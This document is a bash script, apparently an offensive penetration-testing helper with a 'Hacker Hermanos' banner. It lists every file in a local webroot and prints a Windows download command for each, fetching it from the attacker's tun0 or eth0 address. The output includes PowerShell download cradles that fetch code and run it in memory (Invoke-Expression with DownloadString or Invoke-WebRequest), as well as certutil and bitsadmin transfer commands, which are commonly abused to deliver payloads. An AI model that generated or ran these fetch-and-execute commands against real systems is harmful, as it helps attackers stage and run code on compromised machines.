# global vars
NETWORK_INTERFACE=""
PORT=80
USER_IP=""              # OR HOSTNAME
WEBROOT="/var/www/html"

BITSADMIN_MODE=false
CERTUTIL_MODE=false
CRADLE_MODE=false 
PRINT_BANNER=true
WEBCLIENT_MODE=false

####################
#### Functions #####
####################

print_banner(){
    # Define ANSI color code for green and reset.
    green='\033[0;32m'
    reset='\033[0m'

    # Read banner line by line
    while IFS= read -r line; do
        # Print each line in green
        printf "%b\n" "${green}${line}${reset}"
        # Delay for 0.1 seconds
        sleep 0.1
    done << 'EOF'
     _    _            _               _    _                                           
    | |  | |          | |             | |  | |                                          
    | |__| | __ _  ___| | _____ _ __  | |__| | ___ _ __ _ __ ___   __ _ _ ___  ___  ___ 
    |  __  |/ _` |/ __| |/ / _ \ '__| |  __  |/ _ \ '__| '_ ` _ \ / _` | '_  \/ _ \/ __|
    | |  | | (_| | (__|   <  __/ |    | |  | |  __/ |  | | | | | | (_| | | | | (_) \__ \.
    |_|  |_|\__,_|\___|_|\_\___|_|    |_|  |_|\___|_|  |_| |_| |_|\__,_|_| |_|\___/|___/

    It's a big club, and YOU can be in it!
EOF
    sleep 2
}

# Print usage/help message
print_usage() {
    echo "Usage: $0 [options]"
    echo "Options:"
    echo "  -b, --bitsadmin        Use bitsadmin for file transfers"
    echo "  -c, --cradle           Use cradle mode for PowerShell (iwr or webclient)"
    echo "  -cu, --certutil        Use certutil for file transfers"
    echo "  -i, --ip IP            Specify the IP address or hostname"
    echo "  -n, --network IFACE    Specify the network interface (example: eth0)."
    echo "  By default, the script will look for tun0, then eth0."
    echo "  -p, --port PORT        Specify the port (default is 80)"
    echo "  -w, --webroot PATH     Specify the webroot path"
    echo "  -wc, --webclient       Use webclient for file transfers"
    echo "  -h, --help             Display this help message and exit"
}

# retrieve ip function. Accepts one optional argument (network interface)
retrieve_ip() {
    local network_interface=$1
    
    # try argument, tun0, eth0
    if [ -z $network_interface ]; then
        local ip=$(ip addr show tun0 | grep "inet\b" | awk '{print $2}' | cut -d'/' -f1)
        if [ -z "$ip" ]; then
            local ip=$(ip addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d'/' -f1)
        fi
    else
        local ip=$(ip addr show tun0 | grep "$network_interface\b" | awk '{print $2}' | cut -d'/' -f1)
    fi

    echo $ip
}

####################
#### Main Logic ####
####################

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case $1 in
        -b|--bitsadmin) BITSADMIN_MODE=true; shift ;;
        -c|--cradle) CRADLE_MODE=true; shift ;;         # Supported by iwr (default), webclient
        -cu|--certutil) CERTUTIL_MODE=true; shift ;;
        -h|--help) print_usage; exit 0 ;;
        -i|--ip) USER_IP="$2"; shift ;;
        -n|--network) NETWORK_INTERFACE="$2"; shift ;;
        -p|--port) PORT="$2"; shift ;;
        -s|--silent) PRINT_BANNER=false; shift ;;
        -w|--webroot) WEBROOT="$2"; shift ;;
        -wc|--webclient) WEBCLIENT_MODE=true; shift ;;
        *) echo "Unknown parameter passed: $1"; print_usage; exit 1 ;;
    esac
    shift
done

# Check if USER_IP was provided, if not, retrieve it
if [ -z $USER_IP ]; then
    # resolve using tun0, then eth0
    USER_IP=$(retrieve_ip $NETWORK_INTERFACE)

    # if user ip is still empty exit
    if [ -z $USER_IP ]; then
        echo "[-] IP could not be solved"
        exit
    fi
fi

# print banner
if [ "$PRINT_BANNER" = true ]; then 
    print_banner
    echo \n
fi

# print info
echo "Using network interface: $NETWORK_INTERFACE"
echo "Using IP: $USER_IP"
echo "Using webroot path: $WEBROOT"

BASE_URL="http://$USER_IP:$PORT"  # define URL using IP

# Navigate to the webroot directory
cd "$WEBROOT"

(       # wrapping the whole while loop to pipe into sort
# Use find to loop through all files in the webroot and its subdirectories
while IFS= read -r -d '' FILE; do
    # Remove the leading webroot path and prepend the base URL
    URL_PATH="${FILE#$WEBROOT}"
    URL_PATH="${URL_PATH// /%20}" # Simple space to %20 conversion for URL encoding

    # Extract only the file name for the -OutFile parameter
    FILE_NAME=$(basename "$FILE")

    # Cradle Mode
    if [ "$CRADLE_MODE" = true ]; then
        # WEBCLIENT
        if [ "$WEBCLIENT_MODE" = true ]; then
            echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
        # IWR
        else
            echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
        fi
    # CERTUTIL
    elif [ "$CERTUTIL_MODE" = true ]; then
        echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} ${FILE_NAME}"
    # BITSADMIN
    elif [ "$BITSADMIN_MODE" = true ]; then
        echo "bitsadmin /create 1 bitsadmin /addfile 1 ${BASE_URL}${URL_PATH} c:\\Windows\\Tasks\\${FILE_NAME} bitsadmin /RESUME 1 bitsadmin /complete 1"
    # WEBCLIENT
    elif [ "$WEBCLIENT_MODE" = true ]; then
        # Cradle Mode
        if [ "$CRADLE_MODE" = true ]; then
                echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
            else
                echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"${FILE_NAME}\")"
        fi
    # IWR (default)
    else 
        # Cradle Mode
        if [ "$CRADLE_MODE" = true ]; then
            echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
            # IWR
        else
            echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
        fi
    fi
done < <(find "$WEBROOT" -type f -print0)
) | sort 
